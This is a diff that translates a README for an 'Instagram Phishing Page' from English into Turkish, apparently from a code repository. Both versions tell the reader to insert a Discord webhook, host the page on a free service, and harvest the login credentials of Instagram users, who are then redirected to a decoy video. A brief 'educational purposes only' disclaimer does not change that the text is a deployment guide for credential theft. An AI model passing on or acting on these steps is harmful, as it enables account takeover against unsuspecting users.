@@ -1,12 +1,12 @@
-> # **Instagram Phishing Page**
+> # **Instagram Kimlik Avı Sayfası**
 
-❗ **Do not use it for malicious purposes, it's only for educational purposes.**<br/>
+❗ **Kötü amaçlarla kullanmayınız, sadece eğitim amaçlıdır.**<br/>
 
 <br/>
-> ### **How to use:**
-**- My Instagram phishing page is really easy to use, you only have to replace WEBHOOK on line 101 by your Discord webhook :**<br/>
+> ### **Nasıl kullanılır:**
+**- Instagram kimlik avı sayfamın kullanımı gerçekten çok kolay, tek yapmanız gereken 101. satırdaki WEBHOOK'u Discord webhook'unuzla değiştirmek:**<br/>
 ![webhook](https://user-images.githubusercontent.com/81310818/123550149-869fee00-d76c-11eb-9938-34a444eb00e1.PNG)<br>
-**- Next you upload it in your website (like netlify or 000webhost, they are free)**<br>
-**- When someone will login you will receive his credentials and he will be redirected to a funny video on Instagram for example.**<br/>
-**- You can edit the redirection link by editing it on line 108 in the js part in HTML code.**<br/>
-![image](https://user-images.githubusercontent.com/81310818/123550314-4d1bb280-d76d-11eb-8ca0-cec48b286461.png)<br>
+**- Daha sonra web sitenize yükleyin (netlify veya 000webhost gibi, bunlar ücretsizdir)**<br>
+**- Birisi giriş yaptığında onun kimlik bilgilerini alacaksınız ve örneğin Instagram'da komik bir videoya yönlendirileceksiniz.**<br/>
+**- Yönlendirme linkini HTML kodundaki js kısmında 108. satırda düzenleyerek düzenleyebilirsiniz.**<br/>
+![resim](https://user-images.githubusercontent.com/81310818/123550314-4d1bb280-d76d-11eb-8ca0-cec48b286461.png)<br>
